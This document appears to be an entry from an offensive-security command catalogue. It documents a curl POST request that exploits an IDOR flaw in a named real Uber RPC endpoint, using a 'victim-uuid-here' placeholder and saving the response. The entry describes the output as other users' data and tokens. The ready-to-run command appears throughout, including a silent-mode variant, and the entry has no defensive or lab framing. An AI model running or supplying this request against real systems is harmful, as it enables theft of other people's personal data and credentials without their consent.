---
id: c3f4g5h6-i7j8-9013-fghi-6789012345
data: >-
  curl -X POST
  'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H
  'Content-Type: application/json' -d '{"userUuid": "victim-uuid-here"}' -o
  response.json
tags:
  - extraction
  - api
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:22.949Z'
verified: false
validated: true
submitted: true
---
# curl-extract-response

## Command

```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -d '{"userUuid": "victim-uuid-here"}' -o response.json
```

## Description

Executes the IDOR request and saves the response to a file for parsing sensitive data extraction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-H 'Content-Type: application/json'` | JSON header | Yes |
| `-d '{...}'` | Manipulated payload | Yes |
| `-o response.json` | Output file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -d '{"userUuid": "victim-uuid-here"}' -o response.json
```

### Advanced Usage

With silent mode:
```bash
curl -s -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' -H 'Content-Type: application/json' -d '{"userUuid": "victim-uuid-here"}' -o response.json
```

## Expected Output

File 'response.json' containing JSON with user data and tokens.

## Related

- [[Related Procedure: Retrieve-Sensitive-User-Data-and-Token]]
